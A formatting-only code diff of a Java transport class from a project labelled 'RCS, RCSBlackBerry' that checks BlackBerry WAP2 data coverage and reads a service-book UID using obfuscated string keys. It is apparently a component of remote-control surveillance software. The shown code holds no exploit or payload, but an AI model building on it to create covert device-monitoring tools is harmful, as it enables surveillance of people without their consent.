@@ -6,7 +6,7 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
+
 package blackberry.action.sync.transport;
 
 import net.rim.device.api.servicebook.ServiceBook;
@@ -20,7 +20,9 @@ import blackberry.debug.DebugLevel;
 public class Wap2Transport extends HttpTransport {
 
     //#ifdef DEBUG
-    private static Debug debug = new Debug("Wap2Transport", DebugLevel.INFORMATION); //$NON-NLS-1$
+    private static Debug debug = new Debug(
+            "Wap2Transport", DebugLevel.INFORMATION); //$NON-NLS-1$
+
     //#endif
 
     public Wap2Transport(String host) {
@@ -32,28 +34,31 @@ public class Wap2Transport extends HttpTransport {
         debug.trace("isAvailable"); //$NON-NLS-1$
         //#endif
         String uid = getUid();
-        
+
         boolean gprs = (RadioInfo.getNetworkService() & RadioInfo.NETWORK_SERVICE_DATA) > 0;
-        boolean coverage = CoverageInfo.isCoverageSufficient(CoverageInfo.COVERAGE_DIRECT);
-        
+        boolean coverage = CoverageInfo
+                .isCoverageSufficient(CoverageInfo.COVERAGE_DIRECT);
+
         //#ifdef DEBUG
         debug.trace("isAvailable wap2: " + gprs + " & " + coverage); //$NON-NLS-1$ //$NON-NLS-2$
         //#endif
-        
+
         return coverage & gprs & uid != null;
     }
 
     private String getUid() {
         String uid = null;
         final ServiceBook sb = ServiceBook.getSB();
-        final ServiceRecord[] records = sb.findRecordsByCid(Messages.getString("m.0")); //$NON-NLS-1$
+        final ServiceRecord[] records = sb.findRecordsByCid(Messages
+                .getString("m.0")); //$NON-NLS-1$
         for (int i = 0; i < records.length; i++) {
             if (records[i].isValid() && !records[i].isDisabled()) {
                 if (records[i].getUid() != null
                         && records[i].getUid().length() != 0) {
-                    if ((records[i].getCid().toLowerCase().indexOf(Messages.getString("m.5")) != -1) //$NON-NLS-1$
-                            && (records[i].getUid().toLowerCase().indexOf(
-                                    Messages.getString("m.6")) == -1) //$NON-NLS-1$
+                    if ((records[i].getCid().toLowerCase()
+                            .indexOf(Messages.getString("m.5")) != -1) //$NON-NLS-1$
+                            && (records[i].getUid().toLowerCase()
+                                    .indexOf(Messages.getString("m.6")) == -1) //$NON-NLS-1$
                             && (records[i].getUid().toLowerCase()
                                     .indexOf(Messages.getString("m.7")) == -1)) { //$NON-NLS-1$
                         uid = records[i].getUid();
